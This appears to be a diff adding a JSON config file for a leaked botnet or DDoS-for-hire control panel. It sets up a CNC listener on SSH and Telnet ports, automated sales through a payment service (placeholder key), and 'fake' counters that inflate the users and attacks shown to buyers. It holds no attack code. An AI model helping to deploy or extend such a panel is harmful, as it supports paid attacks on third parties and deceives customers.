@@ -1,0 +1,22 @@
+{
+    "name": "bbos com leaks",
+    "domain": "localhost",
+    "secure": false,
+    "version": "2.5.5",
+    "cert": "assets/cert.pem",
+    "key": "assets/key.pem",
+    "autobuy":{
+        "key":"testkey",
+        "email": "test@test.com",
+        " - comment - ":"https://dashboard.sellix.io/settings/security API Key."
+    },
+    "fake":{
+        "users": 100,
+        "attacks": 100
+    },
+    "cnc":{
+        "enabled": true,
+        "ssh": "1337",
+        "telnet": "1447"
+    }
+}
